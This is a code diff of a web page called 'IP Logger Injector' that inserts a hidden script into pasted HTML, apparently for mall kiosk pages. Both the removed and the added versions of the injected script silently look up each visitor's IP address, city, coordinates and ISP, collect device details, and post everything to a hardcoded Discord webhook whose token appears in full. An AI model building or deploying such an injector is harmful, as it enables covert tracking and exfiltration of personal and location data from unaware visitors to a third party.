@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger Injector - Mall Security Tool</title>
+    <title>IP Logger Injector - Mall Security</title>
     <style>
         * {
             margin: 0;
@@ -50,7 +50,6 @@
             border-radius: 6px;
             cursor: pointer;
             font-weight: bold;
-            font-family: monospace;
         }
         button:hover {
             background: linear-gradient(135deg, #5a4ac5, #3a2a9a);
@@ -122,6 +121,7 @@
         }
         .webhook-info code {
             color: #ffb86c;
+            word-break: break-all;
         }
         @media (max-width: 900px) {
             .editor-area {
@@ -161,90 +161,34 @@
 <script>
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds';
 
-    // RAW INJECTION SCRIPT
     function getTrackerScript(label) {
         const cleanLabel = label.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$').replace(/"/g, '\\"');
         
-        return `\n<!-- IP LOGGER INJECTED BY EVIDENCE WATCHER -->\n<script>
-(function(){
-    const KIOSK_LABEL = "${cleanLabel}";
-    const WEBHOOK = "${WEBHOOK_URL}";
-    const TS = new Date().toISOString();
-    const URL = window.location.href;
-    const TITLE = document.title;
-    const REF = document.referrer || "Direct";
-    
-    async function getData() {
-        try {
-            const geo = await fetch('https://ipapi.co/json/').then(r => r.json());
-            const payload = {
-                label: KIOSK_LABEL,
-                timestamp: TS,
-                url: URL,
-                title: TITLE,
-                referrer: REF,
-                ip: geo.ip || 'unknown',
-                city: geo.city || 'unknown',
-                region: geo.region || 'unknown',
-                country: geo.country_name || 'unknown',
-                lat: geo.latitude || 'unknown',
-                lon: geo.longitude || 'unknown',
-                isp: geo.org || 'unknown',
-                ua: navigator.userAgent,
-                screen: screen.width + 'x' + screen.height,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            
-            const embed = {
-                title: \`📍 VISITOR DETECTED - \${payload.label}\`,
-                color: 0xff4444,
-                fields: [
-                    {name: "🌐 IP", value: payload.ip, inline: true},
-                    {name: "📍 Location", value: \`\${payload.city}, \${payload.region}\\n\${payload.country}\`, inline: true},
-                    {name: "🗺️ Coords", value: \`\${payload.lat}, \${payload.lon}\`, inline: true},
-                    {name: "🏢 ISP", value: payload.isp, inline: true},
-                    {name: "📱 Device", value: payload.ua.substring(0, 80), inline: false},
-                    {name: "🔗 Page", value: payload.url.substring(0, 100), inline: false},
-                    {name: "🏷️ Kiosk", value: payload.label, inline: true},
-                    {name: "⏱️ Time", value: payload.timestamp, inline: true}
-                ]
-            };
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({embeds: [embed], username: "EvidenceWatcher"})
-            });
-            console.log("EvidenceWatcher: Data sent for", KIOSK_LABEL);
-        } catch(e) { console.error("EvidenceWatcher error:", e); }
-    }
-    getData();
-})();\n</script>\n<!-- END INJECTED TRACKER -->\n`;
+        return '\n<!-- IP LOGGER INJECTED BY EVIDENCE WATCHER -->\n<script>\n(function(){\n    const KIOSK_LABEL = "' + cleanLabel + '";\n    const WEBHOOK = "' + WEBHOOK_URL + '";\n    const TS = new Date().toISOString();\n    const URL = window.location.href;\n    const TITLE = document.title;\n    const REF = document.referrer || "Direct";\n    \n    async function getData() {\n        try {\n            const geo = await fetch("https://ipapi.co/json/").then(r => r.json());\n            const payload = {\n                label: KIOSK_LABEL,\n                timestamp: TS,\n                url: URL,\n                title: TITLE,\n                referrer: REF,\n                ip: geo.ip || "unknown",\n                city: geo.city || "unknown",\n                region: geo.region || "unknown",\n                country: geo.country_name || "unknown",\n                lat: geo.latitude || "unknown",\n                lon: geo.longitude || "unknown",\n                isp: geo.org || "unknown",\n                ua: navigator.userAgent,\n                screen: screen.width + "x" + screen.height,\n                tz: Intl.DateTimeFormat().resolvedOptions().timeZone\n            };\n            \n            const embed = {\n                title: "📍 VISITOR DETECTED - " + payload.label,\n                color: 0xff4444,\n                fields: [\n                    {name: "🌐 IP", value: payload.ip, inline: true},\n                    {name: "📍 Location", value: payload.city + ", " + payload.region + "\\n" + payload.country, inline: true},\n                    {name: "🗺️ Coords", value: payload.lat + ", " + payload.lon, inline: true},\n                    {name: "🏢 ISP", value: payload.isp, inline: true},\n                    {name: "📱 Device", value: payload.ua.substring(0, 80), inline: false},\n                    {name: "🔗 Page", value: payload.url.substring(0, 100), inline: false},\n                    {name: "🏷️ Kiosk", value: payload.label, inline: true},\n                    {name: "⏱️ Time", value: payload.timestamp, inline: true}\n                ]\n            };\n            await fetch(WEBHOOK, {\n                method: "POST",\n                headers: {"Content-Type": "application/json"},\n                body: JSON.stringify({embeds: [embed], username: "EvidenceWatcher"})\n            });\n        } catch(e) { console.error("EvidenceWatcher error:", e); }\n    }\n    getData();\n})();\n<\/script>\n<!-- END INJECTED TRACKER -->\n';
     }
 
-    // FIXED INJECTOR - Using indexOf for exact matching
     function injectScript(html, label) {
         if (!html || html.trim() === "") {
             throw new Error("Paste some HTML first.");
         }
         if (!label || label.trim() === "") {
-            throw new Error("Enter a label so you know which kiosk is sending data.");
+            throw new Error("Enter a label.");
         }
         
         const scriptBlock = getTrackerScript(label.trim());
         
-        // Try to find closing body tag (case sensitive search on original string)
+        // Look for </body>
         if (html.indexOf('</body>') > -1) {
             return html.replace('</body>', scriptBlock + '\n</body>');
         }
-        // Try to find closing html tag
+        // Look for </html>
         if (html.indexOf('</html>') > -1) {
             return html.replace('</html>', scriptBlock + '\n</html>');
         }
-        // If no closing tags found, just append
+        // Just append
         return html + '\n' + scriptBlock;
     }
 
-    // DOM elements
     const inputArea = document.getElementById('inputHtml');
     const outputArea = document.getElementById('outputHtml');
     const labelInput = document.getElementById('labelInput');
@@ -252,18 +196,9 @@
     const copyBtn = document.getElementById('copyBtn');
     const statusDiv = document.getElementById('statusMsg');
 
-    // Set example HTML
-    inputArea.value = `<html>
-<head>
-    <title>Mall Directory Kiosk</title>
-</head>
-<body>
-    <h1>Welcome to Grand Mall</h1>
-    <p>Find your way around</p>
-</body>
-</html>`;
+    // Clean example - NO TOOL CODE LEAKAGE
+    inputArea.value = '<!DOCTYPE html>\n<html>\n<head>\n    <title>Mall Directory Kiosk</title>\n</head>\n<body>\n    <h1>Welcome to Grand Mall</h1>\n    <p>Find your way around</p>\n</body>\n</html>';
 
-    // Inject button
     injectBtn.addEventListener('click', () => {
         const source = inputArea.value;
         const label = labelInput.value;
@@ -272,16 +207,8 @@
             const result = injectScript(source, label);
             outputArea.value = result;
             statusDiv.className = 'status success';
-            statusDiv.textContent = '✅ INJECTED! Copy the output HTML and deploy it. Every visitor gets logged.';
+            statusDiv.textContent = '✅ INJECTED! Copy the output HTML and deploy.';
             statusDiv.style.display = 'block';
-            
-            // Verify injection worked
-            if (result.indexOf('IP LOGGER INJECTED') > -1) {
-                console.log("Injection confirmed - script tag added");
-            } else {
-                console.warn("Injection may have failed - script not found in output");
-            }
-            
             setTimeout(() => {
                 statusDiv.style.display = 'none';
             }, 3000);
@@ -295,10 +222,9 @@
         }
     });
 
-    // Copy button
     copyBtn.addEventListener('click', async () => {
         const code = outputArea.value;
-        if (!code || code.trim() === "") {
+        if (!code || code.trim() === "" || code === "Click INJECT to generate tracked HTML...") {
             statusDiv.className = 'status error';
             statusDiv.textContent = '❌ Nothing to copy. Inject something first.';
             statusDiv.style.display = 'block';
@@ -308,15 +234,14 @@
         try {
             await navigator.clipboard.writeText(code);
             statusDiv.className = 'status success';
-            statusDiv.textContent = '📋 COPIED! Paste into your website file.';
+            statusDiv.textContent = '📋 COPIED!';
             statusDiv.style.display = 'block';
             setTimeout(() => statusDiv.style.display = 'none', 2000);
         } catch (err) {
-            // Fallback for old browsers
             outputArea.select();
             document.execCommand('copy');
             statusDiv.className = 'status success';
-            statusDiv.textContent = '📋 COPIED (manual method)!';
+            statusDiv.textContent = '📋 COPIED!';
             statusDiv.style.display = 'block';
             setTimeout(() => statusDiv.style.display = 'none', 2000);
         }
